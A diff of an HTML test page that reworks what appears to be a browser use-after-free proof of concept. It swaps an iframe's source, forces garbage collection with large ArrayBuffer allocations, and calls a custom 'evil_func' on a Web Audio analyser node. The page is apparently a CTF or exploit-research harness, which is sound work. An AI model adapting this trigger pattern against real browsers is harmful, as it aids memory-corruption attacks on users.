@@ -24,36 +24,29 @@ index.html
 </body> -->
 
 <body>
-<!-- <iframe id="frame" src="127.0.0.1/tmp.html"></iframe> -->
-<button onclick="removeChild()">Click me</button>
-<embed id="worker" src="data:video/mp4;"></embed>
+<button onclick="trigger()">Trigger</button>
+<iframe id="frame" src="http://127.0.0.1/tmp.html"></iframe>
 <script>
-// let audioContext;
-// let analyserNode;
+let audioContext;
+let analyserNode;
 
-// function gc() {
-//     for (let i = 0; i < 0x50; i++) { new ArrayBuffer(0x1000000); }
-// }
-// function trigger() {
-//     document.getElementById("frame").src = "https://google.com";
-//     gc();
-// }
-// function query() {
-    
-//     analyserNode.evil_func(analyserNode);
-// }
-function removeChild() {
-    var elem = document.getElementById("worker");
-    elem.parentNode.removeChild(elem);
+function gc() {
+    for (let i = 0; i < 0x50; i++) { new ArrayBuffer(0x1000000); }
+}
+function trigger() {
+    document.getElementById("frame").src = "http://127.0.0.1/tmp2.html";
     gc();
 }
+function query() {    
+    analyserNode.evil_func(analyserNode);
+}
 
-// try {
-//     audioContext = new AudioContext();
-// } catch(e) {
-//     alert('Web Audio API is not supported in this browser');
-// }
-// analyserNode = audioContext.createAnalyser();
+try {
+    audioContext = new AudioContext();
+} catch(e) {
+    alert('Web Audio API is not supported in this browser');
+}
+analyserNode = audioContext.createAnalyser();
 
 </script>
 </body>
